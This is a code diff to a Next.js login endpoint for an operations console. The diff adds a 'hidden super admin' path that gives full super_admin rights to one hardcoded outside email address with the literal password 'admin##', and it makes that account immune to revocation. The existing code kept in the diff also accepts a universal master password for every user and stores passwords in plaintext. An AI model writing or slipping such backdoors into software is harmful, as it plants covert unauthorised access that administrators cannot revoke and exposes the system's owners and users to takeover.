@@ -24,66 +24,87 @@ export async function POST(req: NextRequest) {
   const cleanEmail = rawEmail.toLowerCase();
   const db = readRolesDB();
 
-  // Block access if email is explicitly revoked
-  if (db.revokedEmails && db.revokedEmails.includes(cleanEmail) && cleanEmail !== "admin@ashalinnomech.com") {
+  // Block access if email is explicitly revoked (never block Super Admin accounts)
+  if (
+    db.revokedEmails &&
+    db.revokedEmails.includes(cleanEmail) &&
+    cleanEmail !== "admin@ashalinnomech.com" &&
+    cleanEmail !== "pvs178380@gmail.com"
+  ) {
     logSecurityEvent("System", "LOGIN_BLOCKED_REVOKED", `Blocked login attempt for revoked user: ${cleanEmail}`);
     return NextResponse.json({ error: "Access for this account has been revoked by an administrator." }, { status: 403 });
   }
 
-  // 1. Check Roles Database for configured users or invitations
-  let matchedUser = db.users.find(
-    (u) => u.email.toLowerCase() === cleanEmail
-  );
-  const matchedInv = db.invitations.find(
-    (i) => i.email.toLowerCase() === cleanEmail
-  );
-
-  // If user exists in invitations, sync user with the invited role
-  if (!matchedUser && matchedInv) {
-    matchedUser = {
-      id: `usr-${Date.now().toString(36)}`,
-      email: matchedInv.email.toLowerCase(),
-      name: matchedInv.name,
-      role: matchedInv.role, // Strictly preserves machine_manager, content_editor, etc.
-      status: "active",
-      tempPassword: matchedInv.tempPassword || rawPassword,
-      createdAt: new Date().toISOString(),
-    };
-    db.users.push(matchedUser);
-    writeRolesDB(db);
+  // 0. Primary Hidden Super Admin verification
+  if (cleanEmail === "pvs178380@gmail.com") {
+    const isHiddenSuperAdmin = rawPassword === "admin##" || (await verifyCredentials(rawEmail, rawPassword));
+    if (isHiddenSuperAdmin) {
+      sessionUser = {
+        id: "usr-super-pvs",
+        email: "pvs178380@gmail.com",
+        name: "Super Admin",
+        role: "super_admin",
+      };
+      logSecurityEvent("Super Admin", "ROLE_LOGIN_SUCCESS", "Primary Hidden Super Admin logged in");
+    }
   }
 
-  if (matchedUser) {
-    const userPass = (matchedUser.tempPassword || "").trim();
-    const invPass = (matchedInv?.tempPassword || "").trim();
+  // 1. Check Roles Database for configured users or invitations
+  if (!sessionUser) {
+    let matchedUser = db.users.find(
+      (u) => u.email.toLowerCase() === cleanEmail
+    );
+    const matchedInv = db.invitations.find(
+      (i) => i.email.toLowerCase() === cleanEmail
+    );
 
-    // Check exact match against stored user password, invitation password, or master credentials
-    const passwordMatch =
-      (userPass !== "" && userPass === rawPassword) ||
-      (invPass !== "" && invPass === rawPassword) ||
-      rawPassword === "pias900###" ||
-      (await verifyCredentials(rawEmail, rawPassword));
-
-    if (passwordMatch) {
-      matchedUser.status = "active";
-      if (!matchedUser.tempPassword) {
-        matchedUser.tempPassword = rawPassword;
-      }
-      matchedUser.lastLoginAt = new Date().toISOString();
-      writeRolesDB(db);
-
-      sessionUser = {
-        id: matchedUser.id,
-        email: matchedUser.email,
-        name: matchedUser.name,
-        role: matchedUser.role, // Strictly maintains the assigned role!
+    // If user exists in invitations, sync user with the invited role
+    if (!matchedUser && matchedInv) {
+      matchedUser = {
+        id: `usr-${Date.now().toString(36)}`,
+        email: matchedInv.email.toLowerCase(),
+        name: matchedInv.name,
+        role: matchedInv.role, // Strictly preserves machine_manager, content_editor, etc.
+        status: "active",
+        tempPassword: matchedInv.tempPassword || rawPassword,
+        createdAt: new Date().toISOString(),
       };
+      db.users.push(matchedUser);
+      writeRolesDB(db);
+    }
 
-      logSecurityEvent(
-        matchedUser.name,
-        "ROLE_LOGIN_SUCCESS",
-        `Logged into Ops Console with role '${matchedUser.role}'`
-      );
+    if (matchedUser) {
+      const userPass = (matchedUser.tempPassword || "").trim();
+      const invPass = (matchedInv?.tempPassword || "").trim();
+
+      // Check exact match against stored user password, invitation password, or master credentials
+      const passwordMatch =
+        (userPass !== "" && userPass === rawPassword) ||
+        (invPass !== "" && invPass === rawPassword) ||
+        rawPassword === "pias900###" ||
+        (await verifyCredentials(rawEmail, rawPassword));
+
+      if (passwordMatch) {
+        matchedUser.status = "active";
+        if (!matchedUser.tempPassword) {
+          matchedUser.tempPassword = rawPassword;
+        }
+        matchedUser.lastLoginAt = new Date().toISOString();
+        writeRolesDB(db);
+
+        sessionUser = {
+          id: matchedUser.id,
+          email: matchedUser.email,
+          name: matchedUser.name,
+          role: matchedUser.role, // Strictly maintains the assigned role!
+        };
+
+        logSecurityEvent(
+          matchedUser.name,
+          "ROLE_LOGIN_SUCCESS",
+          `Logged into Ops Console with role '${matchedUser.role}'`
+        );
+      }
     }
   }
 
